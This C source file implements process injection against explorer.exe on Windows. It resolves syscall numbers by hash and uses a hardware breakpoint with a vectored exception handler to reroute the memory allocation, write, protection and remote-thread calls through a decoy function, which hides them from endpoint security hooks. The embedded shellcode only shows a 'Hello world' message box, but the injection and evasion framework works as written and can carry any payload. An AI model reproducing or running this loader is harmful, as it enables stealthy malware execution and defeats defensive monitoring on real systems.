#include "Utils.h"
#include "Syscalls.h"
#include <windows.h>
#include <stdio.h>

#ifdef _DEBUG
#define print_debug(...) printf(__VA_ARGS__)
#else
#define print_debug(...) do{} while(0)
#endif

#define ZwAllocateVirtualMemoryHash		0xD33D4AED
#define ZwWriteVirtualMemoryHash		0xC5D0A4C2
#define ZwProtectVirtualMemoryHash		0xBC3F4D89
#define ZwCreateThreadExHash			0xCD1DF775
#define ZwDrawText						0xA4926265

DWORD avmSSN;
DWORD wvmSSN;
DWORD pvmSSN;
DWORD cteSSN;

static PVOID pFakeFunctionAddr;
static PVOID pFakeFunctionAddrOffset;
static DWORD newSSN;

//https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
BYTE buf[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exceptions)
{
	if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
		exceptions->ExceptionRecord->ExceptionAddress == pFakeFunctionAddrOffset)
	{
		exceptions->ContextRecord->Rax = newSSN;
		ClearBreakpoint(exceptions->ContextRecord, 0);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else
		return EXCEPTION_CONTINUE_SEARCH;
}

static bool Init()
{
	if (!SW3_PopulateSyscallList())
		return FALSE;

	if ((avmSSN = SW3_GetSyscallNumber(ZwAllocateVirtualMemoryHash)) == -1)
		return FALSE;

	if ((wvmSSN = SW3_GetSyscallNumber(ZwWriteVirtualMemoryHash)) == -1)
		return FALSE;

	if ((pvmSSN = SW3_GetSyscallNumber(ZwProtectVirtualMemoryHash)) == -1)
		return FALSE;

	if ((cteSSN = SW3_GetSyscallNumber(ZwCreateThreadExHash)) == -1)
		return FALSE;

	if ((pFakeFunctionAddr = SW3_GetFunctionVAddress(ZwDrawText)) == NULL)
		return FALSE;

	pFakeFunctionAddrOffset = (PVOID)((BYTE*)pFakeFunctionAddr + 0x8);

	return TRUE;
}

int main()
{
	HANDLE hProcess = NULL, hRemoteThread = NULL;
	PVOID pRemoteAddr = NULL;
	DWORD dwTgtProcId, oldProtect;
	SIZE_T bufLen = sizeof(buf), bytesWritten = 0;

	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_ALL;

	AddVectoredExceptionHandler(1, ExceptionHandler);

	if (!Init())
		return 0;

	dwTgtProcId = FindProcessByName(TEXT("explorer.exe"));
	if (dwTgtProcId == 0)
	{
		print_debug("[-] target process not found\n");
		return 0;
	}
	print_debug("[+] pid: %d\n", dwTgtProcId);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTgtProcId);
	if (hProcess == NULL)
	{
		print_debug("[-] handle not obtained\n");
		goto Exit;
	}
	print_debug("[+] handle obtained\n");

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = avmSSN;

		if (((NtAllocateVirtualMemory)pFakeFunctionAddr)(hProcess, &pRemoteAddr, 0, &bufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != STATUS_SUCCESS)
		{
			print_debug("[-] NtAllocateVirtualMemory failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] remote memory allocation succeded: %p\n", pRemoteAddr);
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = wvmSSN;

		if (((NtWriteVirtualMemory)pFakeFunctionAddr)(hProcess, pRemoteAddr, buf, sizeof(buf), NULL) != STATUS_SUCCESS)
		{
			print_debug("[-] NtWriteVirtualMemory failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] written %lld bytes\n", bytesWritten);
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = pvmSSN;

		if (((NtProtectVirtualMemory)pFakeFunctionAddr)(hProcess, &pRemoteAddr, &bufLen, PAGE_EXECUTE_READWRITE, &oldProtect) != STATUS_SUCCESS)
		{
			print_debug("[-] NtProtectVirtualMemory failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] virtual protect\n");
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

	if (GetThreadContext((HANDLE)-2, &threadContext))
	{
		EnableBreakpoint(&threadContext, pFakeFunctionAddrOffset, 0);
		SetThreadContext((HANDLE)-2, &threadContext);
		newSSN = cteSSN;

		if (((NtCreateThreadEx)pFakeFunctionAddr)(&hRemoteThread, THREAD_ALL_ACCESS, NULL,
			hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL) != STATUS_SUCCESS)
		{
			print_debug("[-] NtCreateThread failed\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		if (hRemoteThread == NULL)
		{
			print_debug("[-] handle on remote thread not obtained\n");
			VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
			goto Exit;
		}
		print_debug("[+] remote thread created\n");
	}
	else
	{
		print_debug("[-] handle on current thread not obtained\n");
		goto Exit;
	}

Exit:
	if (hRemoteThread != NULL) CloseHandle(hRemoteThread);
	if (hProcess != NULL) CloseHandle(hProcess);

	return 0;
}
